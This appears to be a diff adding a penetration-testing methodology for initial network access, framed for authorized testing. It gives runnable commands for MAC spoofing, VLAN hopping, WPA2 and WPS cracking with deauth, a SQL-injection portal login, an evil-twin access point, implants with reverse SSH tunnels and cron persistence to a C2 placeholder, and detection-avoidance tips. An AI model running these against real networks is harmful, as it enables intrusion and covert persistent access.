@@ -1,0 +1,837 @@
+# Initial Network Access Pentesting Methodology
+
+---
+
+## 1. DHCP Auto-Configuration
+
+**Category:** Physical Network Access  
+**Description:** Connect to the network and automatically obtain IP configuration via DHCP to gain initial network access.
+
+**Tools Required:**
+- Network interface (Ethernet/WiFi adapter)
+- dhclient (Linux)
+- Built-in DHCP client (Windows/macOS)
+- Wireshark/tcpdump (optional for analysis)
+
+**Steps/Commands:**
+```bash
+# Linux
+sudo dhclient -v <INTERFACE_NAME>
+# OR
+sudo dhcpcd <INTERFACE_NAME>
+
+# Windows (CMD as Admin)
+ipconfig /release <ADAPTER_NAME>
+ipconfig /renew <ADAPTER_NAME>
+
+# macOS
+sudo ipconfig set <INTERFACE_NAME> DHCP
+
+# Monitor DHCP traffic
+sudo tcpdump -i <INTERFACE_NAME> -n port 67 and port 68
+```
+
+**Pitfalls:**
+- DHCP exhaustion protection may limit addresses
+- Some networks require authentication before DHCP
+- May receive limited access VLAN assignment
+- DHCP snooping may block responses
+
+**Cleanup Steps:**
+```bash
+# Linux
+sudo dhclient -r <INTERFACE_NAME>
+# Windows
+ipconfig /release <ADAPTER_NAME>
+```
+
+**Suggested Findings:**
+- No network segmentation for unauthorized devices
+- DHCP provides sensitive information (DNS, domain name)
+- No NAC implementation
+
+**Conditions When to Try:**
+- Physical access to network ports achieved
+- No obvious port security indicators
+- Initial reconnaissance phase
+
+---
+
+## 2. Static IP Discovery and Configuration
+
+**Category:** Physical Network Access  
+**Description:** Identify and configure static IP addresses when DHCP is unavailable or restricted.
+
+**Tools Required:**
+- arp-scan
+- nmap
+- Wireshark/tcpdump
+- ifconfig/ip (Linux)
+- ipconfig (Windows)
+
+**Steps/Commands:**
+```bash
+# Passive discovery - Listen for ARP traffic
+sudo tcpdump -i <INTERFACE_NAME> -n arp
+# OR
+sudo tshark -i <INTERFACE_NAME> -f "arp"
+
+# Active scanning (if safe)
+sudo arp-scan -l -I <INTERFACE_NAME>
+
+# Identify network range from captured traffic
+# Look for patterns in observed IPs
+
+# Configure static IP
+# Linux
+sudo ip addr add <TARGET_IP>/<SUBNET_MASK> dev <INTERFACE_NAME>
+sudo ip route add default via <GATEWAY_IP>
+echo "nameserver <DNS_SERVER_IP>" | sudo tee /etc/resolv.conf
+
+# Windows
+netsh interface ip set address "<ADAPTER_NAME>" static <TARGET_IP> <SUBNET_MASK> <GATEWAY_IP>
+netsh interface ip set dns "<ADAPTER_NAME>" static <DNS_SERVER_IP>
+
+# macOS
+sudo ifconfig <INTERFACE_NAME> inet <TARGET_IP> netmask <SUBNET_MASK>
+sudo route add default <GATEWAY_IP>
+```
+
+**Pitfalls:**
+- IP conflicts with existing devices
+- Incorrect subnet mask assumptions
+- Missing VLAN tags
+- Static ARP entries on switches
+
+**Cleanup Steps:**
+```bash
+# Linux
+sudo ip addr del <TARGET_IP>/<SUBNET_MASK> dev <INTERFACE_NAME>
+# Windows
+netsh interface ip set address "<ADAPTER_NAME>" dhcp
+```
+
+**Suggested Findings:**
+- Lack of DHCP snooping
+- No IP conflict detection
+- Network documentation exposed
+
+**Conditions When to Try:**
+- DHCP fails or is disabled
+- Network labels/documentation available
+- After passive traffic observation
+
+---
+
+## 3. MAC Address Spoofing for NAC Bypass
+
+**Category:** NAC Bypass  
+**Description:** Clone MAC address of an authorized device to bypass Network Access Control.
+
+**Tools Required:**
+- macchanger (Linux)
+- ifconfig/ip (Linux)
+- Device Manager (Windows)
+- Wireshark for MAC discovery
+
+**Steps/Commands:**
+```bash
+# Discover authorized MACs
+sudo airodump-ng <WIRELESS_INTERFACE>mon  # For wireless
+sudo arp-scan -l -I <INTERFACE_NAME>       # For wired
+sudo netdiscover -r <IP_RANGE>
+
+# Linux - Change MAC
+sudo ifconfig <INTERFACE_NAME> down
+sudo macchanger -m <TARGET_MAC_ADDRESS> <INTERFACE_NAME>
+# OR
+sudo ip link set dev <INTERFACE_NAME> address <TARGET_MAC_ADDRESS>
+sudo ifconfig <INTERFACE_NAME> up
+
+# Windows (requires adapter support)
+# Via Device Manager > Network Adapters > Properties > Advanced > Network Address
+# OR via Registry:
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\<ADAPTER_NUMBER>" /v NetworkAddress /t REG_SZ /d <MAC_WITHOUT_COLONS>
+
+# Verify change
+ip link show <INTERFACE_NAME>              # Linux
+getmac /v                                   # Windows
+```
+
+**Pitfalls:**
+- Port security with sticky MACs
+- Duplicate MAC detection
+- Some adapters don't support MAC changes
+- Need to wait for target device to disconnect
+
+**Cleanup Steps:**
+```bash
+# Linux - Restore permanent MAC
+sudo macchanger -p <INTERFACE_NAME>
+# Windows - Remove registry entry or reset via Device Manager
+```
+
+**Suggested Findings:**
+- Weak NAC implementation
+- No port security
+- Lack of continuous authentication
+
+**Conditions When to Try:**
+- NAC presence confirmed
+- Authorized devices identified
+- Target device offline or can be forced offline
+
+---
+
+## 4. 802.1X Bypass via Hub/Tap
+
+**Category:** NAC Bypass  
+**Description:** Insert a hub or network tap between an authenticated device and switch port to piggyback on existing authentication.
+
+**Tools Required:**
+- Network hub or tap
+- Two network cables
+- Linux attack machine
+- Optional: Throwing star LAN tap
+
+**Steps/Commands:**
+```bash
+# Physical setup:
+# Wall Port -> Hub/Tap -> Legitimate Device
+#              |
+#              -> Attack Machine
+
+# Configure attack machine for same network
+# Monitor traffic first
+sudo tcpdump -i <INTERFACE_NAME> -w capture.pcap
+
+# Set interface to promiscuous mode
+sudo ip link set <INTERFACE_NAME> promisc on
+
+# Clone network settings from legitimate device
+# Use same IP subnet (different IP), same VLAN if tagged
+
+# For VLAN tagged networks
+sudo modprobe 8021q
+sudo vconfig add <INTERFACE_NAME> <VLAN_ID>
+sudo ifconfig <INTERFACE_NAME>.<VLAN_ID> up
+sudo dhclient <INTERFACE_NAME>.<VLAN_ID>
+```
+
+**Pitfalls:**
+- Modern switches detect multiple MACs per port
+- MACsec encryption prevents bypass
+- Hub causes network performance issues
+- Physical security may prevent insertion
+
+**Cleanup Steps:**
+```bash
+# Remove VLAN interface if created
+sudo vconfig rem <INTERFACE_NAME>.<VLAN_ID>
+# Remove hub/tap from network
+# Reconnect original device directly
+```
+
+**Suggested Findings:**
+- Single MAC per port not enforced
+- No MACsec implementation
+- Physical port access not secured
+
+**Conditions When to Try:**
+- Physical access to authenticated device connection
+- 802.1X without additional security
+- Port allows multiple MACs
+
+---
+
+## 5. VLAN Hopping
+
+**Category:** NAC Bypass  
+**Description:** Exploit VLAN misconfigurations to access restricted network segments.
+
+**Tools Required:**
+- yersinia
+- scapy
+- vconfig (Linux)
+- Native VLAN knowledge
+
+**Steps/Commands:**
+```bash
+# DTP exploitation (force trunk)
+sudo yersinia -G  # GUI mode
+# OR
+sudo yersinia dtp -attack 1 -interface <INTERFACE_NAME>
+
+# Double tagging attack
+# Create nested VLAN tags with scapy
+python3
+>>> from scapy.all import *
+>>> packet = Ether()/Dot1Q(vlan=<NATIVE_VLAN_ID>)/Dot1Q(vlan=<TARGET_VLAN_ID>)/IP(dst="<TARGET_IP>")/ICMP()
+>>> sendp(packet, iface="<INTERFACE_NAME>")
+
+# Manual VLAN configuration
+sudo modprobe 8021q
+# Add VLAN interface
+sudo vconfig add <INTERFACE_NAME> <VLAN_ID>
+sudo ifconfig <INTERFACE_NAME>.<VLAN_ID> <IP_ADDRESS> netmask <SUBNET_MASK> up
+
+# Enumerate VLANs
+for vlan in {1..4096}; do
+    sudo vconfig add <INTERFACE_NAME> $vlan 2>/dev/null
+    sudo ifconfig <INTERFACE_NAME>.$vlan up 2>/dev/null
+    sudo dhclient <INTERFACE_NAME>.$vlan 2>/dev/null &
+done
+```
+
+**Pitfalls:**
+- DTP disabled on modern switches
+- VLAN ACLs block inter-VLAN routing
+- Switch CAM table overflow detection
+- Native VLAN might be unused
+
+**Cleanup Steps:**
+```bash
+# Remove VLAN interfaces
+for vlan in {1..4096}; do
+    sudo vconfig rem <INTERFACE_NAME>.$vlan 2>/dev/null
+done
+```
+
+**Suggested Findings:**
+- DTP enabled on access ports
+- Native VLAN misconfiguration
+- Lack of VLAN ACLs
+- Trunk ports exposed
+
+**Conditions When to Try:**
+- Initial access obtained but limited
+- Switch allows DTP
+- Multiple VLANs discovered
+- Target resources on different VLAN
+
+---
+
+## 6. Guest Network Exploitation
+
+**Category:** Wireless Access  
+**Description:** Leverage weakly secured guest networks as an entry point to the internal network.
+
+**Tools Required:**
+- WiFi adapter with monitor mode
+- aircrack-ng suite
+- nmap
+- proxychains
+
+**Steps/Commands:**
+```bash
+# Connect to open guest network
+nmcli dev wifi connect "<GUEST_SSID>"
+
+# If captive portal present
+# Check for bypass methods
+curl -I http://<GATEWAY_IP>
+curl -X POST http://<PORTAL_IP>/login -d "username=<TEST_USER>&password=<TEST_PASS>"
+
+# Scan for internal network access
+# Check if isolated
+nmap -sn <INTERNAL_IP_RANGE>
+nmap -sT -p 445,3389,22,23 <INTERNAL_IP_RANGE>
+
+# Test for VLAN segmentation bypass
+# Try accessing internal resources
+ping <INTERNAL_DNS_SERVER>
+nslookup <INTERNAL_DOMAIN> <INTERNAL_DNS_SERVER>
+
+# Check for routing to internal networks
+ip route show
+traceroute <INTERNAL_IP>
+
+# Look for misconfigured ACLs
+# Try common internal ports
+nc -zv <INTERNAL_IP> <PORT>
+```
+
+**Pitfalls:**
+- Guest isolation properly configured
+- Firewall rules block internal access
+- IDS monitoring guest network activity
+- Time-based access restrictions
+
+**Cleanup Steps:**
+```bash
+# Disconnect from network
+nmcli connection delete "<GUEST_SSID>"
+```
+
+**Suggested Findings:**
+- Guest network not isolated from internal
+- Weak captive portal authentication
+- No network segmentation
+- Missing egress filtering
+
+**Conditions When to Try:**
+- Guest network available
+- Physical proximity to target
+- Open or weak authentication
+- Internal access required
+
+---
+
+## 7. WiFi WPA2-PSK Cracking
+
+**Category:** Wireless Access  
+**Description:** Capture and crack WPA2 handshakes or exploit PMKID to gain wireless access.
+
+**Tools Required:**
+- aircrack-ng suite
+- hashcat
+- hcxdumptool
+- hcxtools
+
+**Steps/Commands:**
+```bash
+# Put interface in monitor mode
+sudo airmon-ng start <WIRELESS_INTERFACE>
+
+# Scan for networks
+sudo airodump-ng <WIRELESS_INTERFACE>mon
+
+# Capture handshake
+sudo airodump-ng -c <CHANNEL_NUMBER> --bssid <TARGET_BSSID> -w <OUTPUT_FILE> <WIRELESS_INTERFACE>mon
+
+# Deauth to force handshake (separate terminal)
+sudo aireplay-ng -0 <DEAUTH_COUNT> -a <TARGET_BSSID> -c <CLIENT_MAC> <WIRELESS_INTERFACE>mon
+
+# PMKID attack (clientless)
+sudo hcxdumptool -i <WIRELESS_INTERFACE>mon -o pmkid.pcapng --enable_status=1
+hcxpcaptool -z pmkid.16800 pmkid.pcapng
+
+# Crack with aircrack-ng
+aircrack-ng -w <WORDLIST_PATH> -b <TARGET_BSSID> <CAPTURE_FILE>.cap
+
+# Crack with hashcat
+hashcat -m 2500 <CAPTURE_FILE>.hccapx <WORDLIST_PATH>  # WPA2
+hashcat -m 16800 pmkid.16800 <WORDLIST_PATH>           # PMKID
+```
+
+**Pitfalls:**
+- Strong passwords resist cracking
+- WPA3 networks immune to PMKID
+- Detection systems alert on deauth
+- Legal restrictions on wireless attacks
+
+**Cleanup Steps:**
+```bash
+sudo airmon-ng stop <WIRELESS_INTERFACE>mon
+# Remove capture files
+rm -f <OUTPUT_FILE>* pmkid*
+```
+
+**Suggested Findings:**
+- Weak WiFi password
+- WPS enabled
+- No wireless IDS
+- WPA2 instead of WPA3
+
+**Conditions When to Try:**
+- Wireless networks in scope
+- WPA2-PSK confirmed
+- Sufficient time for cracking
+- Wordlist available
+
+---
+
+## 8. WPS PIN Attack
+
+**Category:** Wireless Access  
+**Description:** Exploit WiFi Protected Setup (WPS) to gain network access through PIN brute forcing.
+
+**Tools Required:**
+- reaver
+- bully
+- wash (WPS scanner)
+- pixiewps
+
+**Steps/Commands:**
+```bash
+# Put interface in monitor mode
+sudo airmon-ng start <WIRELESS_INTERFACE>
+
+# Scan for WPS-enabled networks
+sudo wash -i <WIRELESS_INTERFACE>mon
+
+# Reaver attack (traditional)
+sudo reaver -i <WIRELESS_INTERFACE>mon -b <TARGET_BSSID> -c <CHANNEL> -vv -K 1
+
+# Pixie Dust attack (faster)
+sudo reaver -i <WIRELESS_INTERFACE>mon -b <TARGET_BSSID> -c <CHANNEL> -K 1 -Z
+
+# Using Bully
+sudo bully -b <TARGET_BSSID> -c <CHANNEL> -d -v 3 <WIRELESS_INTERFACE>mon
+
+# With specific PIN (if known/suspected)
+sudo reaver -i <WIRELESS_INTERFACE>mon -b <TARGET_BSSID> -p <WPS_PIN>
+
+# Rate limiting bypass
+sudo reaver -i <WIRELESS_INTERFACE>mon -b <TARGET_BSSID> -r <RECURRING_DELAY>:<MAX_ATTEMPTS> -vv
+```
+
+**Pitfalls:**
+- WPS lockout after failed attempts
+- Rate limiting delays attack
+- Some routers have WPS disabled
+- Pixie Dust patched on newer routers
+
+**Cleanup Steps:**
+```bash
+sudo airmon-ng stop <WIRELESS_INTERFACE>mon
+# Kill any remaining processes
+sudo killall reaver bully
+```
+
+**Suggested Findings:**
+- WPS enabled on network
+- No rate limiting on WPS
+- Vulnerable to Pixie Dust
+- Default WPS PIN in use
+
+**Conditions When to Try:**
+- WPS enabled (confirmed by wash)
+- Time for extended brute force
+- Router model known vulnerable
+- Physical proximity maintained
+
+---
+
+## 9. Captive Portal Bypass
+
+**Category:** NAC Bypass  
+**Description:** Bypass captive portal authentication mechanisms to gain network access.
+
+**Tools Required:**
+- MAC spoofing tools
+- Browser with proxy support
+- nmap
+- DNS tunneling tools (iodine)
+
+**Steps/Commands:**
+```bash
+# Method 1: MAC spoofing of authenticated device
+# Find authenticated devices
+sudo nmap -sn <NETWORK_RANGE>
+sudo arp-scan -l
+
+# Spoof authenticated MAC
+sudo macchanger -m <AUTHENTICATED_MAC> <INTERFACE_NAME>
+
+# Method 2: DNS tunneling
+# If DNS queries allowed before auth
+sudo iodine -f -P <PASSWORD> <TUNNEL_SERVER_DOMAIN>
+
+# Method 3: Find open ports/protocols
+# Scan for allowed services pre-auth
+nmap -sT -p 22,443,8080,3389,53,123,500,4500 <GATEWAY_IP>
+
+# Method 4: Portal vulnerability testing
+# Check for authentication bypass
+curl -X POST http://<PORTAL_IP>/login -d "username=<TEST_USER>&password=<TEST_PASS>"
+
+# Test for SQL injection
+curl -X POST http://<PORTAL_IP>/login -d "username=' or '1'='1&password=' or '1'='1"
+
+# Check for default credentials
+curl -X POST http://<PORTAL_IP>/login -d "username=admin&password=admin"
+
+# Method 5: Protocol bypass
+# Try ICMP tunnel
+sudo ptunnel -p <TUNNEL_SERVER_IP> -lp <LOCAL_PORT> -da <DESTINATION_IP> -dp <DESTINATION_PORT>
+```
+
+**Pitfalls:**
+- Session timeouts require re-authentication
+- Deep packet inspection blocks tunnels
+- MAC binding to credentials
+- Rate limiting on authentication attempts
+
+**Cleanup Steps:**
+```bash
+sudo macchanger -p <INTERFACE_NAME>
+# Clear browser cache/cookies
+# Stop tunnel services
+sudo killall iodine ptunnel
+```
+
+**Suggested Findings:**
+- Weak portal authentication
+- DNS queries allowed pre-auth
+- No session validation
+- Default credentials
+
+**Conditions When to Try:**
+- Captive portal present
+- Guest network available
+- Time-based access observed
+- DNS resolution works
+
+---
+
+## 10. Evil Twin Attack
+
+**Category:** Wireless Access  
+**Description:** Create a fake access point mimicking legitimate network to capture credentials.
+
+**Tools Required:**
+- hostapd
+- dnsmasq
+- airbase-ng
+- WiFi adapter supporting AP mode
+
+**Steps/Commands:**
+```bash
+# Create hostapd configuration
+cat > hostapd.conf << EOF
+interface=<WIRELESS_INTERFACE>
+driver=nl80211
+ssid=<TARGET_SSID>
+hw_mode=g
+channel=<CHANNEL_NUMBER>
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=<TEMPORARY_PASSWORD>
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+EOF
+
+# Start fake AP
+sudo hostapd hostapd.conf
+
+# Alternative with airbase-ng
+sudo airbase-ng -e "<TARGET_SSID>" -c <CHANNEL_NUMBER> <WIRELESS_INTERFACE>mon
+
+# Configure DHCP
+sudo dnsmasq -C dnsmasq.conf --no-daemon
+
+# dnsmasq.conf content:
+interface=at0
+dhcp-range=<START_IP>,<END_IP>,<SUBNET_MASK>,12h
+dhcp-option=3,<GATEWAY_IP>
+dhcp-option=6,<DNS_IP>
+server=8.8.8.8
+log-queries
+log-dhcp
+
+# Enable routing
+sudo sysctl net.ipv4.ip_forward=1
+sudo iptables -t nat -A POSTROUTING -o <INTERNET_INTERFACE> -j MASQUERADE
+```
+
+**Pitfalls:**
+- Signal strength differences detected
+- Certificate validation on enterprise networks
+- Illegal in many jurisdictions
+- Client security warnings
+
+**Cleanup Steps:**
+```bash
+sudo killall hostapd airbase-ng dnsmasq
+sudo iptables -t nat -D POSTROUTING -o <INTERNET_INTERFACE> -j MASQUERADE
+sudo sysctl net.ipv4.ip_forward=0
+```
+
+**Suggested Findings:**
+- No certificate pinning
+- Users ignore security warnings
+- No 802.11w (PMF) protection
+- Weak security awareness
+
+**Conditions When to Try:**
+- Authorized evil twin testing
+- Target SSID identified
+- Clients auto-connect observed
+- Social engineering permitted
+
+---
+
+## 11. Physical Device Implant
+
+**Category:** Physical Access  
+**Description:** Deploy hardware implants for persistent network access.
+
+**Tools Required:**
+- LAN Turtle
+- Packet Squirrel
+- Raspberry Pi
+- USB ethernet adapter
+
+**Steps/Commands:**
+```bash
+# LAN Turtle setup
+# Access web interface
+http://172.16.84.1
+# SSH access
+ssh root@172.16.84.1
+
+# Configure reverse shell
+cat > /etc/turtle/autostart << EOF
+/usr/bin/autossh -M 20000 -f -N -R <REMOTE_PORT>:localhost:22 <USER>@<C2_SERVER> -p <SSH_PORT>
+EOF
+
+# Raspberry Pi dropbox setup
+# Configure network bridge
+sudo apt install bridge-utils
+
+# /etc/network/interfaces
+auto br0
+iface br0 inet dhcp
+bridge_ports eth0 eth1
+bridge_stp off
+bridge_fd 0
+bridge_maxwait 0
+
+# Enable IP forwarding
+echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
+sudo sysctl -p
+
+# Setup reverse SSH tunnel
+ssh -fN -R <REMOTE_PORT>:localhost:22 <USER>@<C2_SERVER>
+
+# Add persistence
+(crontab -l 2>/dev/null; echo "@reboot ssh -fN -R <REMOTE_PORT>:localhost:22 <USER>@<C2_SERVER>") | crontab -
+
+# Configure Packet Squirrel
+# Place payload in /root/payloads/switch<POSITION>/payload.sh
+#!/bin/bash
+NETMODE BRIDGE
+LED ATTACK
+ssh -fN -R <REMOTE_PORT>:localhost:22 <USER>@<C2_SERVER>
+LED FINISH
+```
+
+**Pitfalls:**
+- Physical security checks
+- Network anomaly detection
+- Power over Ethernet requirements
+- Device discovery by IT
+
+**Cleanup Steps:**
+- Physical removal of device
+- Network scan for rogue devices
+- Review DHCP leases
+
+**Suggested Findings:**
+- Lack of physical port security
+- No network device monitoring
+- Unauthorized device detection missing
+- No 802.1X on all ports
+
+**Conditions When to Try:**
+- Physical access achieved
+- Long-term access required
+- Remote access needed
+- Covert testing authorized
+
+---
+
+## 12. IPv6 Autoconfiguration Exploitation
+
+**Category:** Network Protocol Exploit  
+**Description:** Exploit IPv6 SLAAC (Stateless Address Autoconfiguration) when IPv4 security controls don't apply.
+
+**Tools Required:**
+- THC-IPv6 toolkit
+- nmap with IPv6 support
+- ping6
+- radvd
+
+**Steps/Commands:**
+```bash
+# Check if IPv6 is active
+ping6 -c 2 ff02::1%<INTERFACE_NAME>
+
+# Scan for IPv6 hosts
+sudo nmap -6 --script=targets-ipv6-multicast-*
+
+# Using THC-IPv6 toolkit
+# Discover IPv6 hosts
+sudo alive6 <INTERFACE_NAME>
+
+# Get IPv6 address via SLAAC
+sudo sysctl -w net.ipv6.conf.<INTERFACE_NAME>.autoconf=1
+sudo sysctl -w net.ipv6.conf.<INTERFACE_NAME>.accept_ra=1
+
+# Force router advertisement acceptance
+sudo rdisc6 <INTERFACE_NAME>
+
+# Exploit missing IPv6 ACLs
+# Try accessing services over IPv6
+nc -6 <TARGET_IPV6_ADDRESS> <PORT>
+ssh <USER>@<TARGET_IPV6_ADDRESS>%<INTERFACE_NAME>
+
+# Scan for services
+sudo nmap -6 -sT -p <PORT_RANGE> <TARGET_IPV6_ADDRESS>
+
+# Use IPv6 to bypass IPv4 restrictions
+curl -6 http://[<TARGET_IPV6_ADDRESS>]:<PORT>
+```
+
+**Pitfalls:**
+- IPv6 might be disabled
+- RA Guard may be configured
+- IPv6 firewalls in place
+- Limited IPv6 routing
+
+**Cleanup Steps:**
+```bash
+# Disable IPv6 autoconfiguration
+sudo sysctl -w net.ipv6.conf.<INTERFACE_NAME>.autoconf=0
+sudo sysctl -w net.ipv6.conf.<INTERFACE_NAME>.accept_ra=0
+```
+
+**Suggested Findings:**
+- IPv6 enabled but not secured
+- Missing IPv6 ACLs
+- No RA Guard configured
+- Dual-stack misconfigurations
+
+**Conditions When to Try:**
+- IPv6 observed on network
+- IPv4 security controls strict
+- Dual-stack environment
+- IPv6 not properly managed
+
+---
+
+## Notes
+
+### General Best Practices
+- Always verify you have proper authorization before attempting
+- Document all methods attempted and results
+- Consider noise level and detection likelihood
+- Have rollback plan for each technique
+- Monitor for security alerts during testing
+
+### Legal Considerations
+- Ensure signed authorization documents
+- Stay within defined scope
+- Some techniques may be illegal without permission
+- Wireless attacks have specific legal restrictions
+- Physical implants require explicit authorization
+
+### Detection Avoidance Tips
+- Randomize MAC addresses when spoofing
+- Use common device manufacturer OUIs
+- Throttle scanning and attack rates
+- Mimic legitimate traffic patterns
+- Test during high-traffic periods
+
+### Post-Access Steps
+1. Document access method that worked
+2. Establish persistence if authorized
+3. Begin internal enumeration
+4. Map out network topology
+5. Identify high-value targets
+6. Plan lateral movement strategy
